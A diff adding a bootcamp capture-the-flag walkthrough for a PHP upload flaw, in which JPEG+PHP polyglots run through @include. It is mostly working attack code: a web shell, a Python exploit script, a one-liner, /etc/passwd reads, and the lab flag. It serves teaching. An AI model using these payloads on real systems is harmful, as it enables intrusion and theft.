@@ -379,4 +379,309 @@ mv pixel.jpg shell.php.jpg
 
 ---
 
+## Detailed Step-by-Step Walkthrough
+
+> **Verified:** March 2026
+> **Flag:** `flag{php_include_is_dangerous_2026_AetherBreach_polyglot}`
+
+Follow these exact steps to exploit the file upload vulnerability.
+
+---
+
+### Step 1: Access the File Upload Lab
+
+**Open in browser:**
+```
+http://10.10.61.221/profile/
+```
+
+You'll see:
+- **Business Name:** AetherVision AI — Quantum Deep Validator
+- **Upload form:** Accepts only JPEG files (.jpg, .jpeg)
+- **Hint:** "Only the first 256 bytes are inspected for JPEG validity"
+
+---
+
+### Step 2: Understand the Vulnerability
+
+The server code does this:
+
+```php
+// 1. Check first 256 bytes for valid JPEG
+$head = file_get_contents($file['tmp_name'], false, null, 0, 256);
+$info = @getimagesizefromstring($head);
+
+// 2. Upload the file
+move_uploaded_file($file['tmp_name'], $upload_path);
+
+// 3. DANGEROUS: Include (execute) the uploaded file!
+@include $upload_path;
+```
+
+**The vulnerability:** `@include` executes ANY PHP code in the uploaded file, even if it's disguised as a JPEG!
+
+---
+
+### Step 3: Create a Valid Minimal JPEG
+
+First, create a valid JPEG file. Use this base64-encoded 1x1 pixel JPEG:
+
+```bash
+echo '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRof
+Hh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwh
+MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAAR
+CAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAn/xAAUEAEAAAAAAAAAAAAAAAAA
+AAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMB
+AAIRAxEAPwCwAB//2Q==' | base64 -d > pixel.jpg
+```
+
+Verify it's a valid JPEG:
+```bash
+file pixel.jpg
+# Output: pixel.jpg: JPEG image data, JFIF standard 1.01...
+```
+
+---
+
+### Step 4: Create the Polyglot File (JPEG + PHP)
+
+Append PHP code to the valid JPEG:
+
+```bash
+# Copy the valid JPEG
+cp pixel.jpg shell.jpg
+
+# Append PHP payload
+echo '<?php echo "SHELL_READY\n"; system($_GET["cmd"]); echo "\nFLAG: ".FLAG; ?>' >> shell.jpg
+```
+
+The resulting file:
+- **First 286 bytes:** Valid JPEG data (passes validation)
+- **After 286 bytes:** PHP code (gets executed by `@include`)
+
+Verify the file is still detected as JPEG:
+```bash
+file shell.jpg
+# Output: shell.jpg: JPEG image data, JFIF standard 1.01...
+```
+
+---
+
+### Step 5: Upload the Polyglot File
+
+**Method A: Browser Upload**
+1. Go to http://10.10.61.221/profile/
+2. Click "Choose File" and select your `shell.jpg`
+3. Click "Validate & Analyze"
+
+**Method B: curl Upload**
+```bash
+curl -X POST 'http://10.10.61.221/profile/' \
+  -F 'image=@shell.jpg;type=image/jpeg'
+```
+
+---
+
+### Step 6: Capture the Flag!
+
+When you upload the polyglot file, the server:
+1. Validates first 256 bytes → ✅ Valid JPEG
+2. Saves the file to `uploads/shell.jpg`
+3. Runs `@include 'uploads/shell.jpg'` → **PHP executes!**
+
+**Response contains:**
+```
+SHELL_READY
+FLAG: flag{php_include_is_dangerous_2026_AetherBreach_polyglot}
+```
+
+---
+
+### Step 7: Execute Commands
+
+Create shells with different commands:
+
+**whoami:**
+```bash
+cp pixel.jpg test.jpg
+echo '<?php system("whoami"); ?>' >> test.jpg
+curl -X POST 'http://10.10.61.221/profile/' -F 'image=@test.jpg;type=image/jpeg'
+```
+**Output:** `www-data`
+
+**id:**
+```bash
+cp pixel.jpg test.jpg
+echo '<?php system("id"); ?>' >> test.jpg
+curl -X POST 'http://10.10.61.221/profile/' -F 'image=@test.jpg;type=image/jpeg'
+```
+**Output:** `uid=82(www-data) gid=82(www-data) groups=82(www-data)`
+
+**ls -la:**
+```bash
+cp pixel.jpg test.jpg
+echo '<?php system("ls -la /app"); ?>' >> test.jpg
+curl -X POST 'http://10.10.61.221/profile/' -F 'image=@test.jpg;type=image/jpeg'
+```
+**Output:**
+```
+total 20
+drwxr-xr-x    1 www-data www-data      4096 Mar  5 14:19 .
+-rw-r--r--    1 root     root          5594 Mar  5 14:20 index.php
+drwxrwxrwx    2 root     root          4096 Mar  6 20:34 uploads
+```
+
+**cat /etc/passwd:**
+```bash
+cp pixel.jpg test.jpg
+echo '<?php system("cat /etc/passwd"); ?>' >> test.jpg
+curl -X POST 'http://10.10.61.221/profile/' -F 'image=@test.jpg;type=image/jpeg'
+```
+
+---
+
+### Step 8: Interactive Shell (Advanced)
+
+Create a reusable web shell:
+
+```bash
+cp pixel.jpg webshell.jpg
+cat >> webshell.jpg << 'EOF'
+<?php
+echo "=== Web Shell ===\n";
+if(isset($_GET['cmd'])) {
+    echo "Command: " . $_GET['cmd'] . "\n";
+    echo "Output:\n";
+    system($_GET['cmd']);
+}
+echo "\nFLAG: " . FLAG . "\n";
+?>
+EOF
+```
+
+Upload and use with different commands:
+```bash
+# Upload once
+curl -X POST 'http://10.10.61.221/profile/' \
+  -F 'image=@webshell.jpg;type=image/jpeg;filename=webshell.jpg'
+
+# Note: The PHP executes during upload, not when accessing the file directly
+# Each upload = one command execution
+```
+
+---
+
+### Python Script for Easy Exploitation
+
+```python
+#!/usr/bin/env python3
+import requests
+import sys
+import base64
+
+# Minimal valid JPEG (1x1 white pixel)
+JPEG_B64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAn/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCwAB//2Q=="
+
+def create_polyglot(command):
+    jpeg_data = base64.b64decode(JPEG_B64)
+    php_code = f'<?php system("{command}"); ?>'.encode()
+    return jpeg_data + php_code
+
+def execute(url, command):
+    polyglot = create_polyglot(command)
+    files = {'image': ('shell.jpg', polyglot, 'image/jpeg')}
+    response = requests.post(url, files=files)
+    # Extract text after JPEG binary data
+    try:
+        output = response.content.decode('utf-8', errors='ignore')
+        # Find PHP output (after binary garbage)
+        lines = [l for l in output.split('\n') if l.isprintable() and len(l) > 0]
+        return '\n'.join(lines[-10:])  # Last 10 lines
+    except:
+        return response.text
+
+if __name__ == "__main__":
+    url = "http://10.10.61.221/profile/"
+    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
+    print(f"[*] Executing: {cmd}")
+    print(execute(url, cmd))
+```
+
+**Usage:**
+```bash
+python3 exploit.py "id"
+python3 exploit.py "whoami"
+python3 exploit.py "cat /etc/passwd"
+python3 exploit.py "ls -la /"
+```
+
+---
+
+### Bash One-Liner
+
+```bash
+# Quick command execution
+cmd="id"; echo '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAn/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCwAB//2Q==' | base64 -d > /tmp/x.jpg && echo "<?php system(\"$cmd\"); ?>" >> /tmp/x.jpg && curl -s -X POST 'http://10.10.61.221/profile/' -F "image=@/tmp/x.jpg;type=image/jpeg" | strings | tail -5
+```
+
+---
+
+## Attack Results Summary
+
+| Command | Output |
+|---------|--------|
+| `whoami` | `www-data` |
+| `id` | `uid=82(www-data) gid=82(www-data) groups=82(www-data)` |
+| `pwd` | `/app` |
+| `ls /app` | `index.php uploads` |
+| `cat /etc/passwd` | Shows system users |
+
+**Flag:** `flag{php_include_is_dangerous_2026_AetherBreach_polyglot}`
+
+---
+
+## Why This Attack Works
+
+```
+Attack Flow:
+
+1. Create valid JPEG file (passes getimagesizefromstring check)
+   └── First 256+ bytes are valid JPEG structure
+
+2. Append PHP code after JPEG data
+   └── <?php system($_GET["cmd"]); ?>
+
+3. Upload the polyglot file
+   └── Server validates first 256 bytes → ✅ Valid JPEG!
+
+4. Server executes @include on uploaded file
+   └── PHP interpreter parses the file
+   └── Ignores binary JPEG data (not valid PHP)
+   └── Finds <?php tag → Executes the code!
+
+5. Command output returned in response
+   └── We have Remote Code Execution!
+```
+
+---
+
+## Troubleshooting
+
+**Upload rejected?**
+- Ensure the JPEG header is valid (use the base64 provided)
+- Check Content-Type is `image/jpeg`
+- File extension should be `.jpg` or `.jpeg`
+
+**No output in response?**
+- The output is mixed with binary JPEG data
+- Use `strings` command or filter the response
+- Look for text after the binary garbage
+
+**PHP not executing?**
+- Verify server has `@include` vulnerability
+- Check if PHP code is properly formatted
+- Ensure `<?php` tag is present
+
+---
+
 *LeaguesOfCode Cybersecurity Bootcamp 2026*
